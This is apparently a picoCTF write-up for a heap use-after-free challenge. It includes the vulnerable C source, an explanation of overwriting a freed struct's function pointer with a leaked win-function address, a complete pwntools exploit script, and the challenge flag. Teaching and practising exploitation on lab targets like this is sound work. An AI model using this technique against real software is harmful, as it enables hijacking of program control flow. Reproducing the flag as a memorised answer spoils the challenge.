# Unsubscriptions Are Free

## Description

Author: thelshell

Check out my new video-game and spaghetti-eating streaming channel on Twixer! program and get a flag. source nc mercury.picoctf.net 48259

## Challenge

We are given an interactive prompt where we can interact with our account and perform various actions.
The program determines which function to call by storing the pointer to that function in a struct, based on the option selected.

### Mitigations

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

### Source code

```c
typedef struct {
	uintptr_t (*whatToDo)();
	char *username;
} cmd;

char choice;
cmd *user;

void hahaexploitgobrrr(){
 	char buf[FLAG_BUFFER];
 	FILE *f = fopen("flag.txt","r");
 	fgets(buf,FLAG_BUFFER,f);
 	fprintf(stdout,"%s\n",buf);
 	fflush(stdout);
}

...

void s(){
 	printf("OOP! Memory leak...%p\n",hahaexploitgobrrr);
 	puts("Thanks for subsribing! I really recommend becoming a premium member!");
}

...

void leaveMessage(){
	puts("I only read premium member messages but you can ");
	puts("try anyways:");
	char* msg = (char*)malloc(8);
	read(0, msg, 8);
}

void i(){
	char response;
  	puts("You're leaving already(Y/N)?");
	scanf(" %c", &response);
	if(toupper(response)=='Y'){
		puts("Bye!");
		free(user);
	}else{
		puts("Ok. Get premium membership please!");
	}
}

...

int main(){
	setbuf(stdout, NULL);
	user = (cmd *)malloc(sizeof(user));
	while(1){
		printMenu();
		processInput();
		//if(user){
			doProcess(user);
		//}
	}
	return 0;
}
```

## Solution

The `user` pointer is never cleared after deleting an accounter.
We have a use after free, as it will continue to call `doProcess(user)` after deleting the account.

The `cmd` struct has a function pointer at the top of the heap chunk, which determines which function is called.

There is a function that leaks the address of the win function, `hahaexploitgobrrr`.

There is a function that writes 8 bytes onto the heap.

If we delete our account, it will write these 8 bytes into memory previously occupied by the `user`.
The contents will overwrite the function pointer, however, this pointer is still being used to call other functions from `main`.

We can leak the win function address, then delete our account and write the address to the heap to jump to it.

## Exploit

```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host mercury.picoctf.net --port 48259 vuln
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('vuln')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'mercury.picoctf.net'
port = int(args.PORT or 48259)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    p = process([exe.path] + argv, *a, **kw)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
    return p

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
context.terminal=['tmux', 'splitw', '-h']
gdbscript = '''
b*0x08048d7c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()

io.recvuntil('(e)xit\n')
io.sendline('S')
io.recvuntil('...')
leak = int(io.recvuntil('\n').decode(), 0)
log.success('leak: ' + hex(leak))

io.recvuntil('(e)xit\n')
io.sendline('I')
io.recvuntil('?\n')
io.send('Y')

io.recvuntil('(e)xit\n')
io.sendline('L')
io.recvuntil(':\n')
io.send(p64(leak))

io.interactive()
```

## Flag

`picoCTF{d0ubl3_j30p4rdy_cff1f12d}`

